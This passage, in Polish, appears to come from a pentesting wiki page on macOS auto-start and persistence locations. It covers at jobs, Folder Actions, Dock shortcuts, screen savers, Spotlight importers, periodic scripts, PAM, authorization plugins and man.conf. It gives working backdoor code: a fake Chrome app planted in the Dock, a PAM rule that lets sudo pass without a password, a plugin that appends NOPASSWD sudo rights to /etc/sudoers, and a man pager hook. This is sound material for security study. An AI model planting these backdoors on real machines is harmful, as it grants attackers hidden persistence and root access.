Powyżej widzimy dwa zaplanowane zadania. Możemy wydrukować szczegóły zadania, używając `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Jeśli zadania AT nie są włączone, utworzone zadania nie zostaną wykonane.
{% endhint %}

**Pliki zadań** można znaleźć pod adresem `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Nazwa pliku zawiera kolejkę, numer zadania i czas jego zaplanowanego uruchomienia. Na przykład, przyjrzyjmy się `a0001a019bdcd2`.

* `a` - to kolejka
* `0001a` - numer zadania w zapisie szesnastkowym, `0x1a = 26`
* `019bdcd2` - czas w zapisie szesnastkowym. Reprezentuje minuty od epoki. `0x019bdcd2` to `26991826` w systemie dziesiętnym. Jeśli pomnożymy to przez 60, otrzymamy `1619509560`, co odpowiada `GMT: 2021. kwiecień 27., wtorek 7:46:00`.

Jeśli wydrukujemy plik zadania, zobaczymy, że zawiera te same informacje, które uzyskaliśmy używając `at -c`.

### Akcje folderów

Opis: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Opis: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale musisz móc wywołać `osascript` z argumentami, aby skontaktować się z **`System Events`** i skonfigurować Akcje folderów
* Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Posiada podstawowe uprawnienia TCC, takie jak Pulpit, Dokumenty i Pobrane

#### Lokalizacja

* **`/Library/Scripts/Folder Action Scripts`**
* Wymagane uprawnienia administratora
* **Wywołanie**: Dostęp do określonego folderu
* **`~/Library/Scripts/Folder Action Scripts`**
* **Wywołanie**: Dostęp do określonego folderu

#### Opis i Wykorzystanie

Akcje folderów to skrypty automatycznie uruchamiane przez zmiany w folderze, takie jak dodawanie, usuwanie elementów, otwieranie lub zmiana rozmiaru okna folderu. Te akcje mogą być wykorzystane do różnych zadań i mogą być uruchamiane w różny sposób, np. za pomocą interfejsu Finder lub poleceń terminala.

Aby skonfigurować Akcje folderów, masz opcje takie jak:

1. Tworzenie przepływu pracy Akcji folderu za pomocą [Automatora](https://support.apple.com/guide/automator/welcome/mac) i instalowanie go jako usługi.
2. Dołączanie skryptu ręcznie za pomocą Konfiguracji Akcji folderu w menu kontekstowym folderu.
3. Wykorzystanie OSAScript do wysyłania komunikatów zdarzeń Apple do `System Events.app` w celu programowego ustawienia Akcji folderu.
* Ta metoda jest szczególnie przydatna do osadzania akcji w systemie, oferując poziom trwałości.

Poniższy skrypt jest przykładowym przykładem tego, co może być wykonane przez Akcję folderu:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Aby skrypt powyżej można było używać w Akcjach folderu, skompiluj go za pomocą:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Po skompilowaniu skryptu skonfiguruj Akcje folderu, wykonując poniższy skrypt. Ten skrypt włączy Akcje folderu globalnie i specyficznie dołączy wcześniej skompilowany skrypt do folderu Pulpit.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Uruchom skrypt instalacyjny za pomocą:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Oto sposób wdrożenia tej trwałości za pomocą interfejsu graficznego:

To jest skrypt, który zostanie wykonany:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Skompiluj go za pomocą: `osacompile -l JavaScript -o folder.scpt source.js`

Przenieś go do:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Następnie otwórz aplikację `Folder Actions Setup`, wybierz **folder, który chcesz obserwować** i wybierz w Twoim przypadku **`folder.scpt`** (w moim przypadku nazwałem go output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Teraz, jeśli otworzysz ten folder za pomocą **Findera**, Twój skrypt zostanie wykonany.

Ta konfiguracja została zapisana w **pliku plist** znajdującym się w **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** w formacie base64.

Teraz spróbujmy przygotować tę trwałość bez dostępu do interfejsu graficznego:

1. **Skopiuj `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** do `/tmp`, aby go zabezpieczyć:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Usuń** właśnie ustawione Folder Actions:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Teraz, gdy mamy puste środowisko

3. Skopiuj plik z kopią zapasową: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Otwórz aplikację Folder Actions Setup.app, aby załadować tę konfigurację: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
To nie zadziałało dla mnie, ale to są instrukcje z opisu :(
{% endhint %}

### Skróty Docka

Opis: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Przydatne do ominięcia piaskownicy: [✅](https://emojipedia.org/check-mark-button)
* Ale musisz mieć zainstalowaną złośliwą aplikację w systemie
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* `~/Library/Preferences/com.apple.dock.plist`
* **Wywołanie**: Gdy użytkownik kliknie na aplikację w Docku

#### Opis i Wykorzystanie

Wszystkie aplikacje widoczne w Docku są określone w pliku plist: **`~/Library/Preferences/com.apple.dock.plist`**

Można **dodać aplikację** tylko za pomocą:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Z wykorzystaniem pewnej **inżynierii społecznej** można **podrobić na przykład Google Chrome** w doku i faktycznie uruchomić własny skrypt:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Wybieraki kolorów

Opis: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Wymagane jest bardzo konkretne działanie
* Zakończysz w innej piaskownicy
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* `/Library/ColorPickers`
* Wymagane uprawnienia roota
* Wywołanie: Użyj wybieraka kolorów
* `~/Library/ColorPickers`
* Wywołanie: Użyj wybieraka kolorów

#### Opis i Wykorzystanie

**Skompiluj pakiet wybieraka kolorów** z twoim kodem (możesz użyć [**na przykład tego**](https://github.com/viktorstrate/color-picker-plus)) i dodaj konstruktor (podobnie jak w sekcji [Wygaszacz ekranu](macos-auto-start-locations.md#screen-saver)) i skopiuj pakiet do `~/Library/ColorPickers`.

Następnie, gdy wybierak kolorów zostanie wywołany, twój kod również powinien.

Zauważ, że binarny ładowacz twojej biblioteki ma **bardzo restrykcyjną piaskownicę**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Wtyczki synchronizacji Finder

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Opis**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Przydatne do ominięcia piaskownicy: **Nie, ponieważ musisz uruchomić własną aplikację**
* Ominięcie TCC: ???

#### Lokalizacja

* Konkretna aplikacja

#### Opis & Wykorzystanie

Przykład aplikacji z rozszerzeniem synchronizacji Finder [**znajduje się tutaj**](https://github.com/D00MFist/InSync).

Aplikacje mogą mieć `Rozszerzenia synchronizacji Finder`. To rozszerzenie zostanie umieszczone wewnątrz aplikacji, która zostanie uruchomiona. Ponadto, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **w piaskownicy** (choć mogą być dodane luźne wyjątki) i musi być zarejestrowane za pomocą:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Wygaszacz ekranu

Opis: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Opis: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Jednakże skończysz w powszechnej aplikacji piaskownicy
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* `/System/Library/Screen Savers`
* Wymagane uprawnienia roota
* **Wywołanie**: Wybierz wygaszacz ekranu
* `/Library/Screen Savers`
* Wymagane uprawnienia roota
* **Wywołanie**: Wybierz wygaszacz ekranu
* `~/Library/Screen Savers`
* **Wywołanie**: Wybierz wygaszacz ekranu

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Opis i Wykorzystanie

Utwórz nowy projekt w Xcode i wybierz szablon generujący nowy **Wygaszacz ekranu**. Następnie dodaj do niego kod, na przykład poniższy kod generujący logi.

**Zbuduj** to i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz interfejs graficzny wygaszacza ekranu i po prostu kliknij na niego, powinien wygenerować wiele logów:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Należy pamiętać, że wewnątrz uprawnień binarnych, które ładują ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), można znaleźć **`com.apple.security.app-sandbox`**, więc będzie się znajdować **w powszechnym sandboxie aplikacji**.
{% endhint %}

Kod oszczędzania:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Wtyczki Spotlight

opis: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Jednakże skończysz w piaskownicy aplikacji
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
* Piaskownica wydaje się bardzo ograniczona

#### Lokalizacja

* `~/Library/Spotlight/`
* **Wywołanie**: Tworzony jest nowy plik z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
* `/Library/Spotlight/`
* **Wywołanie**: Tworzony jest nowy plik z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
* Wymagane uprawnienia roota
* `/System/Library/Spotlight/`
* **Wywołanie**: Tworzony jest nowy plik z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
* Wymagane uprawnienia roota
* `Some.app/Contents/Library/Spotlight/`
* **Wywołanie**: Tworzony jest nowy plik z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
* Wymagana nowa aplikacja

#### Opis i Wykorzystanie

Spotlight to wbudowana funkcja wyszukiwania w macOS, zaprojektowana w celu zapewnienia użytkownikom **szybkiego i wszechstronnego dostępu do danych na ich komputerach**.\
Aby ułatwić tę szybką funkcję wyszukiwania, Spotlight utrzymuje **własną bazę danych** i tworzy indeks poprzez **parsowanie większości plików**, umożliwiając szybkie wyszukiwanie zarówno nazw plików, jak i ich zawartości.

Podstawowy mechanizm Spotlight obejmuje centralny proces o nazwie 'mds', co oznacza **'serwer metadanych'**. Ten proces zarządza całym serwisem Spotlight. Dodatkowo istnieje wiele demonów 'mdworker', które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Te zadania są możliwe dzięki wtyczkom importującym Spotlight, czyli **"paczkom .mdimporter"**, które umożliwiają Spotlightowi zrozumienie i indeksowanie treści w różnorodnych formatach plików.

Wtyczki lub **paczki `.mdimporter`** znajdują się w wymienionych wcześniej miejscach, a jeśli pojawi się nowa paczka, zostanie załadowana w ciągu minuty (nie ma potrzeby restartowania żadnej usługi). Te paczki muszą wskazać, **jakie typy plików i rozszerzenia mogą obsługiwać**, w ten sposób Spotlight będzie ich używał, gdy zostanie utworzony nowy plik z wskazanym rozszerzeniem.

Możliwe jest **znalezienie wszystkich `mdimporterów`** załadowanych, uruchamiając:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
I na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** jest używany do analizowania tego typu plików (rozszerzenia `.iba` i `.book` między innymi):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Jeśli sprawdzisz Plist innego `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. Dzieje się tak dlatego, że jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) i nie musi określać rozszerzeń.

Co więcej, domyślne wtyczki systemowe zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` firmy Apple.
{% endhint %}

Aby stworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę, **`CFBundleDocumentTypes`** i dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz wspierać, i odzwierciedlić je w **`schema.xml`**. Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonać swój payload, gdy zostanie utworzony plik z przetworzonym rozszerzeniem.

Na koniec **skompiluj i skopiuj swój nowy plik `.mdimporter`** do jednej z powyższych lokalizacji, a następnie sprawdź, czy jest ładowany, **monitorując logi** lub sprawdzając **`mdimport -L.`**

### ~~Panel Preferencji~~

{% hint style="danger" %}
Wygląda na to, że to już nie działa.
{% endhint %}

Opis: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Wymaga określonej akcji użytkownika
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Opis

Wygląda na to, że to już nie działa.

## Ominięcie Piaskownicy Root

{% hint style="success" %}
Tutaj znajdziesz lokalizacje startowe przydatne do **omijania piaskownicy**, które pozwalają po prostu **wykonać coś, pisząc to do pliku** będąc **rootem** i/lub wymagając innych **dziwnych warunków.**
{% endhint %}

### Okresowe

Opis: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale musisz być rootem
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Wymagany root
* **Wywołanie**: Kiedy nadejdzie odpowiedni czas
* `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
* Wymagany root
* **Wywołanie**: Kiedy nadejdzie odpowiedni czas

#### Opis i Wykorzystanie

Skrypty okresowe (**`/etc/periodic`**) są wykonywane z powodu **daemonów uruchamiania** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Zauważ, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc nie zadziała to dla potencjalnej eskalacji uprawnień.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Istnieją inne skrypty okresowe, które zostaną wykonane, o czym świadczy **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Jeśli uda ci się napisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **wykonany wcześniej lub później**.

{% hint style="warning" %}
Zauważ, że skrypt okresowy zostanie **wykonany jako właściciel skryptu**. Jeśli zwykły użytkownik jest właścicielem skryptu, zostanie on wykonany jako ten użytkownik (co może zapobiec atakom eskalacji uprawnień).
{% endhint %}

### PAM

Opis: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Opis: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale musisz być rootem
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* Zawsze wymagany jest dostęp jako root

#### Opis i Wykorzystanie

Ponieważ PAM jest bardziej skoncentrowany na **trwałości** i złośliwym oprogramowaniu niż na łatwym wykonaniu wewnątrz macOS, ten blog nie będzie zawierał szczegółowego wyjaśnienia, **przeczytaj opisy, aby lepiej zrozumieć tę technikę**.

Sprawdź moduły PAM za pomocą:
```bash
ls -l /etc/pam.d
```
Technika trwałości/przywilejów wykorzystująca PAM jest tak łatwa jak modyfikacja modułu /etc/pam.d/sudo poprzez dodanie na początku linii:
```bash
auth       sufficient     pam_permit.so
```
Więc będzie to **wyglądać** mniej więcej tak:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
I dlatego każda próba użycia **`sudo` będzie działać**.

{% hint style="danger" %}
Zauważ, że ten katalog jest chroniony przez TCC, więc jest bardzo prawdopodobne, że użytkownik otrzyma prośbę o dostęp.
{% endhint %}

### Wtyczki Autoryzacyjne

Opis: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Opis: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale musisz być rootem i dokonać dodatkowych konfiguracji
* Ominięcie TCC: ???

#### Lokalizacja

* `/Library/Security/SecurityAgentPlugins/`
* Wymagane uprawnienia roota
* Konieczne jest również skonfigurowanie bazy danych autoryzacyjnych do użycia wtyczki

#### Opis i Wykorzystanie

Możesz stworzyć wtyczkę autoryzacyjną, która będzie wykonywana podczas logowania użytkownika, aby utrzymać trwałość. Aby uzyskać więcej informacji na temat tworzenia takich wtyczek, sprawdź poprzednie opisy (i bądź ostrożny, źle napisana wtyczka może zablokować Cię i będziesz musiał wyczyścić swój Mac w trybie odzyskiwania).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Przenieś** pakiet do lokalizacji, z której ma być załadowany:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Na koniec dodaj **regułę** ładowania tego Pluginu:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** powie frameworkowi autoryzacyjnemu, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto **`privileged`** spowoduje, że zostanie wykonany przez użytkownika root.

Uruchomienie:
```bash
security authorize com.asdf.asdf
```
I następnie **grupa personelu powinna mieć dostęp sudo** (odczytaj `/etc/sudoers`, aby potwierdzić).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale musisz być rootem, a użytkownik musi używać man
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

* **`/private/etc/man.conf`**
* Wymagany jest dostęp roota
* **`/private/etc/man.conf`**: Za każdym razem, gdy jest używane man

#### Opis i Wykorzystanie

Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarny/skrypt do użycia podczas otwierania plików dokumentacji man. Ścieżkę do wykonywalnego pliku można zmodyfikować, aby za każdym razem, gdy użytkownik używa man do czytania dokumentów, uruchamiany był backdoor.

Na przykład ustaw w **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
I następnie utwórz `/tmp/view` jako:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Przydatne do ominięcia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
* Ale musisz być rootem i Apache musi być uruchomiony
* Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd nie ma uprawnień

